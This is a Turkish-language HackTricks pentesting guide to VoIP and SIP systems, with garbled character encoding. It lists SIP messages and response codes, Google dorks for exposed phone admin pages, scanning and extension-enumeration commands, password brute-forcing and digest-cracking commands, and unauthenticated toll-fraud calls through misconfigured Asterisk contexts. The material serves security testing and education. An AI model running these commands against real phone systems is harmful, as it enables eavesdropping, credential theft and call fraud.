# Pentesting VoIP

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## VoIP Temel Bilgiler

VoIP'in nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± Ã¶ÄŸrenmeye baÅŸlamak iÃ§in kontrol edin:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Temel Mesajlar
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## YanÄ±t KodlarÄ±

**1xxâ€”GeÃ§ici YanÄ±tlar**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xxâ€”BaÅŸarÄ±lÄ± YanÄ±tlar**
```
200 OK
202 Accepted
204 No Notification
```
**3xxâ€”Yeniden YÃ¶nlendirme YanÄ±tlarÄ±**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xxâ€”Ä°stemci HatasÄ± YanÄ±tlarÄ±**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xxâ€”Sunucu HatasÄ± YanÄ±tlarÄ±**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xxâ€”KÃ¼resel Hata YanÄ±tlarÄ±**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Telefon NumaralarÄ±

KÄ±rmÄ±zÄ± TakÄ±mÄ±n yapabileceÄŸi ilk adÄ±mlardan biri, OSINT araÃ§larÄ±, Google AramalarÄ± veya web sayfalarÄ±nÄ± tarayarak ÅŸirketle iletiÅŸim kurmak iÃ§in mevcut telefon numaralarÄ±nÄ± aramaktÄ±r.

Telefon numaralarÄ±na sahip olduÄŸunuzda, operatÃ¶rÃ¼ tanÄ±mlamak iÃ§in Ã§evrimiÃ§i hizmetleri kullanabilirsiniz:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

OperatÃ¶rÃ¼n VoIP hizmetleri sunup sunmadÄ±ÄŸÄ±nÄ± bilmek, ÅŸirketin VoIP kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± belirlemenizi saÄŸlar... AyrÄ±ca, ÅŸirketin VoIP hizmetleri kiralamamÄ±ÅŸ olabileceÄŸi, ancak kendi VoIP PBX'ini geleneksel telefon aÄŸÄ±na baÄŸlamak iÃ§in PSTN kartlarÄ± kullandÄ±ÄŸÄ± da mÃ¼mkÃ¼ndÃ¼r.

MÃ¼zik gibi otomatik yanÄ±tlarÄ±n varlÄ±ÄŸÄ± genellikle VoIP kullanÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶sterir.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT bilgileri

VoIP yazÄ±lÄ±mÄ±nÄ± tanÄ±mlamaya yardÄ±mcÄ± olan diÄŸer herhangi bir OSINT sayÄ±mÄ±, KÄ±rmÄ±zÄ± TakÄ±m iÃ§in faydalÄ± olacaktÄ±r.

### AÄŸ SayÄ±mÄ±

* **`nmap`** UDP hizmetlerini tarama yeteneÄŸine sahiptir, ancak taranan UDP hizmetlerinin sayÄ±sÄ± nedeniyle Ã§ok yavaÅŸtÄ±r ve bu tÃ¼r hizmetlerle Ã§ok doÄŸru olmayabilir.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** SIPVicious'tan (`sudo apt install sipvicious`): Belirtilen aÄŸda SIP hizmetlerini bulacaktÄ±r.
* `svmap` **engellemesi kolaydÄ±r** Ã§Ã¼nkÃ¼ User-Agent `friendly-scanner` kullanÄ±r, ancak `/usr/share/sipvicious/sipvicious` dosyasÄ±ndaki kodu deÄŸiÅŸtirebilir ve bunu deÄŸiÅŸtirebilirsiniz.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS taramasÄ±`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS taramasÄ±, UDP, TCP veya TLS Ã¼zerinden SIP hizmetleri iÃ§in Ã§ok hÄ±zlÄ± bir tarayÄ±cÄ±dÄ±r. Ã‡oklu iÅŸ parÃ§acÄ±ÄŸÄ± kullanÄ±r ve geniÅŸ aÄŸ aralÄ±klarÄ±nÄ± tarayabilir. Bir port aralÄ±ÄŸÄ±nÄ± kolayca belirtmeye, hem TCP hem de UDP'yi taramaya, baÅŸka bir yÃ¶ntemi kullanmaya (varsayÄ±lan olarak OPTIONS kullanacaktÄ±r) ve farklÄ± bir User-Agent belirtmeye olanak tanÄ±r (ve daha fazlasÄ±).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Ek AÄŸ NumaralandÄ±rma

PBX ayrÄ±ca aÅŸaÄŸÄ±daki gibi diÄŸer aÄŸ hizmetlerini de aÃ§Ä±ÄŸa Ã§Ä±karÄ±yor olabilir:

* **69/UDP (TFTP)**: Firmware gÃ¼ncellemeleri
* **80 (HTTP) / 443 (HTTPS)**: CihazÄ± web Ã¼zerinden yÃ¶netmek iÃ§in
* **389 (LDAP)**: KullanÄ±cÄ± bilgilerini depolamak iÃ§in alternatif
* **3306 (MySQL)**: MySQL veritabanÄ±
* **5038 (Manager)**: Asterisk'i diÄŸer platformlardan kullanmaya olanak tanÄ±r
* **5222 (XMPP)**: Jabber kullanarak mesajlar
* **5432 (PostgreSQL)**: PostgreSQL veritabanÄ±
* Ve diÄŸerleri...

### YÃ¶ntem NumaralandÄ±rma

PBX'te kullanÄ±labilir **yÃ¶ntemlerin hangileri olduÄŸunu** bulmak mÃ¼mkÃ¼ndÃ¼r `SIPPTS enumerate` kullanarak [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Sunucu yanÄ±tlarÄ±nÄ± analiz etme

GÃ¶nderdiÄŸimiz mesajÄ±n ve baÅŸlÄ±klarÄ±n tÃ¼rÃ¼ne baÄŸlÄ± olarak, sunucunun bize geri gÃ¶nderdiÄŸi baÅŸlÄ±klarÄ± analiz etmek Ã§ok Ã¶nemlidir. [**sippts**](https://github.com/Pepelux/sippts) ile `SIPPTS send` kullanarak, tÃ¼m baÅŸlÄ±klarÄ± manipÃ¼le ederek kiÅŸiselleÅŸtirilmiÅŸ mesajlar gÃ¶nderebilir ve yanÄ±tÄ± analiz edebiliriz.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Sunucu websockets kullanÄ±yorsa veri elde etmek de mÃ¼mkÃ¼ndÃ¼r. [**sippts**](https://github.com/Pepelux/sippts) iÃ§indeki `SIPPTS wssend` ile kiÅŸiselleÅŸtirilmiÅŸ WS mesajlarÄ± gÃ¶nderebiliriz.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Extension Enumeration

PBX (Ã–zel Santral) sistemindeki uzantÄ±lar, bir organizasyon veya iÅŸletme iÃ§indeki **bireysel** telefon hatlarÄ±na, cihazlara veya kullanÄ±cÄ±lara atanan **benzersiz iÃ§ tanÄ±mlayÄ±cÄ±lardÄ±r**. UzantÄ±lar, her kullanÄ±cÄ± veya cihaz iÃ§in bireysel dÄ±ÅŸ telefon numaralarÄ±na ihtiyaÃ§ duymadan, **organizasyon iÃ§inde Ã§aÄŸrÄ±larÄ± verimli bir ÅŸekilde yÃ¶nlendirmeyi** mÃ¼mkÃ¼n kÄ±lar.

* **`svwar`** from SIPVicious (`sudo apt install sipvicious`): `svwar`, Ã¼cretsiz bir SIP PBX uzantÄ± hattÄ± tarayÄ±cÄ±sÄ±dÄ±r. Kavramsal olarak, **bir uzantÄ± aralÄ±ÄŸÄ±nÄ± veya belirli bir uzantÄ± listesini tahmin ederek** geleneksel wardialer'lara benzer ÅŸekilde Ã§alÄ±ÅŸÄ±r.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten, bir SIP sunucusundaki uzantÄ±larÄ± tanÄ±mlar. Sipexten, bÃ¼yÃ¼k aÄŸ ve port aralÄ±klarÄ±nÄ± kontrol edebilir.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Metasploit ile uzantÄ±larÄ±/kullanÄ±cÄ± adlarÄ±nÄ± da listeleyebilirsiniz:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** bir Inter Asterisk Exchange protokolÃ¼ **kullanÄ±cÄ± adÄ± brute-force enumeratÃ¶rÃ¼**dÃ¼r. enumIAX, iki farklÄ± modda Ã§alÄ±ÅŸabilir; SÄ±ralÄ± KullanÄ±cÄ± AdÄ± Tahmini veya SÃ¶zlÃ¼k SaldÄ±rÄ±sÄ±.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP SaldÄ±rÄ±larÄ±

### Åifre Kaba Kuvvet - Ã§evrimiÃ§i

**PBX** ve bazÄ± **uzantÄ±lar/kullanÄ±cÄ± adlarÄ±** keÅŸfedildikten sonra, bir KÄ±rmÄ±zÄ± Ekip, yaygÄ±n ÅŸifrelerin bir sÃ¶zlÃ¼ÄŸÃ¼nÃ¼ kullanarak kimlik doÄŸrulamasÄ±nÄ± kaba kuvvetle denemek iÃ§in bir uzantÄ±ya **`REGISTER` yÃ¶ntemi** ile **kimlik doÄŸrulamasÄ± yapmayÄ±** deneyebilir.

{% hint style="danger" %}
Bir **kullanÄ±cÄ± adÄ±** uzantÄ±yla aynÄ± olabilir, ancak bu uygulama PBX sistemine, yapÄ±landÄ±rmasÄ±na ve organizasyonun tercihlerine baÄŸlÄ± olarak deÄŸiÅŸebilir...

EÄŸer kullanÄ±cÄ± adÄ± uzantÄ±yla aynÄ± deÄŸilse, onu kaba kuvvetle denemek iÃ§in **kullanÄ±cÄ± adÄ±nÄ± bulmanÄ±z** gerekecek.
{% endhint %}

* **`svcrack`** SIPVicious'tan (`sudo apt install sipvicious`): SVCrack, bir PBX'teki belirli bir kullanÄ±cÄ± adÄ±/uzantÄ± iÃ§in ÅŸifreyi kÄ±rmanÄ±za olanak tanÄ±r.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack, SIP hizmetleri iÃ§in uzaktan bir ÅŸifre kÄ±rÄ±cÄ±dÄ±r. Rcrack, farklÄ± IP'lerde ve port aralÄ±klarÄ±nda birkaÃ§ kullanÄ±cÄ± iÃ§in ÅŸifreleri test edebilir.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP Sniffing

EÄŸer bir **AÃ§Ä±k Wifi aÄŸÄ±** iÃ§inde VoIP ekipmanÄ± bulursanÄ±z, **tÃ¼m bilgileri dinleyebilirsiniz**. DahasÄ±, daha kapalÄ± bir aÄŸda (Ethernet Ã¼zerinden baÄŸlÄ± veya korumalÄ± Wifi) iseniz, **PBX ile aÄŸ geÃ§idi arasÄ±nda** bilgi dinlemek iÃ§in **MitM saldÄ±rÄ±larÄ±** gerÃ§ekleÅŸtirebilirsiniz, Ã¶rneÄŸin [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing).

AÄŸ bilgileri arasÄ±nda, ekipmanÄ± yÃ¶netmek iÃ§in **web kimlik bilgileri**, kullanÄ±cÄ± **uzantÄ±larÄ±**, **kullanÄ±cÄ± adÄ±**, **IP** adresleri, hatta **hashlenmiÅŸ ÅŸifreler** ve **RTP paketleri** bulabilirsiniz; bu paketleri **konuÅŸmayÄ± duymak iÃ§in** yeniden Ã¼retebilirsiniz ve daha fazlasÄ±.

Bu bilgileri elde etmek iÃ§in Wireshark, tcpdump gibi araÃ§lar kullanabilirsiniz... ancak **VoIP konuÅŸmalarÄ±nÄ± dinlemek iÃ§in Ã¶zel olarak oluÅŸturulmuÅŸ bir araÃ§** [**ucsniff**](https://github.com/Seabreg/ucsniff) 'dir.

{% hint style="danger" %}
**SIP iletiÅŸiminde TLS kullanÄ±lÄ±yorsa**, SIP iletiÅŸimini aÃ§Ä±k olarak gÃ¶remeyeceÄŸinizi unutmayÄ±n.\
**SRTP** ve **ZRTP** kullanÄ±ldÄ±ÄŸÄ±nda da aynÄ± durum geÃ§erlidir, **RTP paketleri aÃ§Ä±k metin olarak olmayacaktÄ±r**.
{% endhint %}

#### SIP kimlik bilgileri (Åifre Kaba Kuvvet - Ã§evrimdÄ±ÅŸÄ±)

**Kimlik bilgileri nasÄ±l gÃ¶nderiliyor** Ã¶ÄŸrenmek iÃ§in [**SIP REGISTER iletiÅŸimini**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) daha iyi anlamak iÃ§in bu Ã¶rneÄŸi kontrol edin.

* **`sipdump`** & **`sipcrack`,** **sipcrack**'in bir parÃ§asÄ± (`apt-get install sipcrack`): Bu araÃ§lar, SIP protokolÃ¼ iÃ§indeki **digest kimlik doÄŸrulamalarÄ±nÄ±** **pcap**'den **Ã§Ä±karabilir** ve bunlarÄ± **kaba kuvvet** ile Ã§Ã¶zebilir.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump, bir pcap dosyasÄ±ndan digest kimlik doÄŸrulamalarÄ±nÄ± Ã§Ä±karabilir.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack, SIPPTS dÃ¶kÃ¼mÃ¼nden elde edilen Ã¶zet kimlik doÄŸrulamalarÄ±nÄ± kÄ±rmak iÃ§in bir araÃ§tÄ±r.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark, bir PCAP dosyasÄ±ndan SIP protokol verilerini Ã§Ä±karÄ±r.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF kodlarÄ±

**SIP kimlik bilgileri** aÄŸ trafiÄŸinde bulunmanÄ±n yanÄ± sÄ±ra, Ã¶rneÄŸin **sesli mesaj** eriÅŸimi iÃ§in kullanÄ±lan DTMF kodlarÄ±nÄ±n da bulunmasÄ± mÃ¼mkÃ¼ndÃ¼r.\
Bu kodlar **INFO SIP mesajlarÄ±**, **ses** veya **RTP paketleri** iÃ§inde gÃ¶nderilebilir. Kodlar RTP paketleri iÃ§indeyse, konuÅŸmanÄ±n o kÄ±smÄ±nÄ± kesip multimo aracÄ±nÄ± kullanarak Ã§Ä±kartabilirsiniz:
```bash
multimon -a DTMF -t wac pin.wav
```
### Ãœcretsiz Aramalar / Asterisk BaÄŸlantÄ± YanlÄ±ÅŸ YapÄ±landÄ±rmalarÄ±

Asterisk'te **belirli bir IP adresinden** veya **herhangi bir IP adresinden** bir baÄŸlantÄ±ya izin vermek mÃ¼mkÃ¼ndÃ¼r:
```
host=10.10.10.10
host=dynamic
```
EÄŸer bir IP adresi belirtilmiÅŸse, host **her zaman REGISTER** istekleri gÃ¶ndermeye ihtiyaÃ§ duymayacaktÄ±r (REGISTER paketinde genellikle 30 dakika olan yaÅŸam sÃ¼resi gÃ¶nderilir, bu da baÅŸka bir senaryoda telefonun her 30 dakikada bir REGISTER yapmasÄ± gerektiÄŸi anlamÄ±na gelir). Ancak, VoIP sunucusundan Ã§aÄŸrÄ± almak iÃ§in baÄŸlantÄ±lara izin veren aÃ§Ä±k portlara sahip olmasÄ± gerekecektir.

KullanÄ±cÄ±larÄ± tanÄ±mlamak iÃ§in ÅŸu ÅŸekilde tanÄ±mlanabilirler:

* **`type=user`**: KullanÄ±cÄ± yalnÄ±zca Ã§aÄŸrÄ± alabilir.
* **`type=friend`**: Peer olarak Ã§aÄŸrÄ± yapmak ve kullanÄ±cÄ± olarak almak mÃ¼mkÃ¼ndÃ¼r (uzantÄ±larla kullanÄ±lÄ±r)
* **`type=peer`**: Peer olarak Ã§aÄŸrÄ± gÃ¶ndermek ve almak mÃ¼mkÃ¼ndÃ¼r (SIP-trunklar)

AyrÄ±ca, insecure deÄŸiÅŸkeni ile gÃ¼ven oluÅŸturmak da mÃ¼mkÃ¼ndÃ¼r:

* **`insecure=port`**: IP tarafÄ±ndan doÄŸrulanan peer baÄŸlantÄ±larÄ±na izin verir.
* **`insecure=invite`**: INVITE mesajlarÄ± iÃ§in kimlik doÄŸrulama gerektirmez
* **`insecure=port,invite`**: Her ikisi de

{% hint style="warning" %}
**`type=friend`** kullanÄ±ldÄ±ÄŸÄ±nda, **host** deÄŸiÅŸkeninin **deÄŸeri** **kullanÄ±lmayacaktÄ±r**, bu nedenle bir admin **bu deÄŸeri kullanarak bir SIP-trunk'Ä± yanlÄ±ÅŸ yapÄ±landÄ±rÄ±rsa**, **herkes buna baÄŸlanabilecektir**.

Ã–rneÄŸin, bu yapÄ±landÄ±rma savunmasÄ±z olacaktÄ±r:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Ãœcretsiz Ã‡aÄŸrÄ±lar / Asterisk BaÄŸlamÄ± YanlÄ±ÅŸ YapÄ±landÄ±rmalarÄ±

Asterisk'te bir **baÄŸlam**, **iliÅŸkili uzantÄ±larÄ±, eylemleri ve kurallarÄ± gruplandÄ±ran** adlandÄ±rÄ±lmÄ±ÅŸ bir konteyner veya bÃ¶lÃ¼mÃ¼dÃ¼r. Arama planÄ±, Asterisk sisteminin temel bileÅŸenidir, Ã§Ã¼nkÃ¼ **gelen ve giden Ã§aÄŸrÄ±larÄ±n nasÄ±l iÅŸlendiÄŸini ve yÃ¶nlendirildiÄŸini tanÄ±mlar**. BaÄŸlamlar, arama planÄ±nÄ± dÃ¼zenlemek, eriÅŸim kontrolÃ¼nÃ¼ yÃ¶netmek ve sistemin farklÄ± bÃ¶lÃ¼mleri arasÄ±nda ayrÄ±m saÄŸlamak iÃ§in kullanÄ±lÄ±r.

Her baÄŸlam, genellikle **`extensions.conf`** dosyasÄ±nda yapÄ±landÄ±rma dosyasÄ±nda tanÄ±mlanÄ±r. BaÄŸlamlar, kÃ¶ÅŸeli parantezlerle gÃ¶sterilir ve baÄŸlam adÄ± bunlarÄ±n iÃ§inde yer alÄ±r. Ã–rneÄŸin:
```bash
csharpCopy code[my_context]
```
Ä°Ã§erik baÄŸlamÄ±nda, uzantÄ±larÄ± (Ã§evrilen numaralarÄ±n kalÄ±plarÄ±) tanÄ±mlarsÄ±nÄ±z ve bunlarÄ± bir dizi eylem veya uygulama ile iliÅŸkilendirirsiniz. Bu eylemler, Ã§aÄŸrÄ±nÄ±n nasÄ±l iÅŸleneceÄŸini belirler. Ã–rneÄŸin:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Bu Ã¶rnek, "my\_context" adlÄ± basit bir baÄŸlamÄ± ve "100" uzantÄ±sÄ±nÄ± gÃ¶stermektedir. Birisi 100'Ã¼ aradÄ±ÄŸÄ±nda, Ã§aÄŸrÄ± yanÄ±tlanacak, bir karÅŸÄ±lama mesajÄ± Ã§alacak ve ardÄ±ndan Ã§aÄŸrÄ± sonlandÄ±rÄ±lacaktÄ±r.

Bu, **herhangi bir baÅŸka numarayÄ± aramaya** izin veren **baÅŸka bir baÄŸlamdÄ±r**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
EÄŸer admin **varsayÄ±lan baÄŸlamÄ±** ÅŸu ÅŸekilde tanÄ±mlarsa:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Herkes **sunucuyu baÅŸka bir numaraya arama yapmak iÃ§in kullanabilecektir** (ve sunucunun yÃ¶neticisi arama iÃ§in Ã¶deme yapacaktÄ±r).
{% endhint %}

{% hint style="danger" %}
AyrÄ±ca, varsayÄ±lan olarak **`sip.conf`** dosyasÄ± **`allowguest=true`** iÃ§erir, bu nedenle **herhangi bir** saldÄ±rgan **kimlik doÄŸrulamasÄ± olmadan** baÅŸka bir numaraya arama yapabilecektir.
{% endhint %}

*   **`SIPPTS invite`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite, **PBX sunucusunun kimlik doÄŸrulamasÄ± olmadan arama yapmamÄ±za izin verip vermediÄŸini** kontrol eder. EÄŸer SIP sunucusunun yanlÄ±ÅŸ bir yapÄ±landÄ±rmasÄ± varsa, dÄ±ÅŸ numaralara arama yapmamÄ±za izin verecektir. AyrÄ±ca, aramayÄ± ikinci bir dÄ±ÅŸ numaraya aktarmamÄ±za da izin verebilir.

Ã–rneÄŸin, eÄŸer Asterisk sunucunuzun kÃ¶tÃ¼ bir baÄŸlam yapÄ±landÄ±rmasÄ± varsa, yetkilendirme olmadan INVITE isteÄŸini kabul edebilirsiniz. Bu durumda, bir saldÄ±rgan herhangi bir kullanÄ±cÄ±/parola bilmeden arama yapabilir. 

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Ãœcretsiz aramalar / YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ IVRS

IVRS, **EtkileÅŸimli Sesli YanÄ±t Sistemi** anlamÄ±na gelir; kullanÄ±cÄ±larÄ±n ses veya tuÅŸlama girdileri aracÄ±lÄ±ÄŸÄ±yla bilgisayarlÄ± bir sistemle etkileÅŸimde bulunmalarÄ±nÄ± saÄŸlayan bir telekomÃ¼nikasyon teknolojisidir. IVRS, bilgi saÄŸlama, Ã§aÄŸrÄ±larÄ± yÃ¶nlendirme ve kullanÄ±cÄ± girdilerini toplama gibi Ã§eÅŸitli iÅŸlevler sunan **otomatik Ã§aÄŸrÄ± yÃ¶netimi** sistemleri oluÅŸturmak iÃ§in kullanÄ±lÄ±r.

VoIP sistemlerindeki IVRS genellikle ÅŸunlardan oluÅŸur:

1. **Sesli istemler**: KullanÄ±cÄ±larÄ± IVR menÃ¼ seÃ§enekleri ve talimatlarÄ± aracÄ±lÄ±ÄŸÄ±yla yÃ¶nlendiren Ã¶nceden kaydedilmiÅŸ sesli mesajlar.
2. **DTMF** (Ã‡ift Tonlu Ã‡ok FrekanslÄ±) sinyalleme: Telefon tuÅŸlarÄ±na basarak Ã¼retilen tuÅŸlama girdileri, IVR menÃ¼lerinde gezinmek ve girdi saÄŸlamak iÃ§in kullanÄ±lÄ±r.
3. **Ã‡aÄŸrÄ± yÃ¶nlendirme**: Ã‡aÄŸrÄ±larÄ±, kullanÄ±cÄ± girdisine dayalÄ± olarak belirli departmanlar, ajanlar veya dahili numaralar gibi uygun bir hedefe yÃ¶nlendirme.
4. **KullanÄ±cÄ± giriÅŸi toplama**: Arayanlardan hesap numaralarÄ±, vaka kimlikleri veya diÄŸer ilgili veriler gibi bilgileri toplama.
5. **DÄ±ÅŸ sistemlerle entegrasyon**: IVR sistemini veritabanlarÄ± veya diÄŸer yazÄ±lÄ±m sistemleriyle baÄŸlayarak bilgiye eriÅŸim saÄŸlama, gÃ¼ncelleme yapma, eylemler gerÃ§ekleÅŸtirme veya olaylarÄ± tetikleme.

Asterisk VoIP sisteminde, **`extensions.conf`** dosyasÄ± ve `Background()`, `Playback()`, `Read()` gibi Ã§eÅŸitli uygulamalar kullanarak bir IVR oluÅŸturabilirsiniz. Bu uygulamalar, sesli istemleri Ã§alma, kullanÄ±cÄ± girdilerini toplama ve Ã§aÄŸrÄ± akÄ±ÅŸÄ±nÄ± kontrol etme konusunda yardÄ±mcÄ± olur.

#### ZayÄ±f yapÄ±landÄ±rma Ã¶rneÄŸi
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
